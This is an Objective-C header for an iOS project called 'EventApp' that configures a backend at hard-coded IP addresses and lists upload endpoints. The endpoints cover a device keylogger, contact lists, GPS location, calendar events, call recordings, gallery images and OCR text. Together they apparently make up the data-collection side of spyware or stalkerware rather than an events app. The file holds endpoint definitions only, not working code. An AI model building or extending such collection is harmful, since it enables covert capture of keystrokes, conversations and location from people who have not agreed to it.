//
//  ApiUrl.h
//  EventApp
//
//  Created by Shahid on 3/4/16.
//  Copyright (c) 2016 Sahid. All rights reserved.
//

#ifndef EventApp_ApiUrl_h
#define EventApp_ApiUrl_h

//dev server 1
#define kAPI_BaseUrl @"http://108.61.211.172/w1_mdm_app/index.php/api/"

//local dev server 1
//#define kAPI_BaseUrl @"http://192.168.90.102:8080/w1/w1_mdm_app/index.php/api/"

//prod server 1
//#define kAPI_BaseUrl @"http://41.33.226.121/w1_mdm_app/index.php/api/"


//Save device information
#define kAPI_Send_DeviceInfo @"device/deviceInfo"
//param: uuid,devce_token,data (uuid, os, version, time zone, device type)

//Device status
#define kAPI_Check_DeviceStatus @"device/deviceStatus"
//param: uuid

//Device General Info
#define kAPI_Send_GeneralInfo @"device/deviceGeneralInfo"
//param: uuid, data (Wifi Status,Mobile Data Status,Bluetooth Status,Device storage,Battery Level,carrier)

//contact info
#define kAPI_Send_ContactList @"device/contactInfo"
//param: data,uuid

//Device General Info
#define kAPI_Send_DeviceKeylogger @"device/deviceKeylogger"
//param: uuid, data, date (keyboard string)

//gps info
#define kAPI_Send_Location @"device/gpsInfo"
//param: data,uuid

//{"Accuracy":11.899999618530273,"Latitude":26.27705,"Longitude":63.03363666666668,"Bearing":265.489990234375,"Provider":"gps","DateTime":"2017-01-18 12:08:08"}
//Must is Latitude, Longitude, DateTime

//calendar
#define kAPI_Send_Calendar @"device/deviceEventInfo"
//param: uuid, data

#define kAPI_Send_Media @"media/mediaUpload"
//param: file, file_type, module, app_name,uuid , filepath,other
// filetype=image.video.audio
// module=callrecording.gallery
// app name= call

#define kAPI_Send_Gallery_Image @"media/gallerymediaUpload"
//params: uuid and image (in base64data), path

#define kAPI_Send_OCR_text @"media/ocrMediaUpload"
//params: device_id, ocr_text, file (file parameter)

#define kAPI_End_OCR_Media @"media/ocrMediaUploadEnd"
//param: ocr_code

//send battery level if battery is less than 20%
#define kAPI_Send_LowBattery @"device/deviceBatteryLevel"
//Param: uuid, battery

#endif
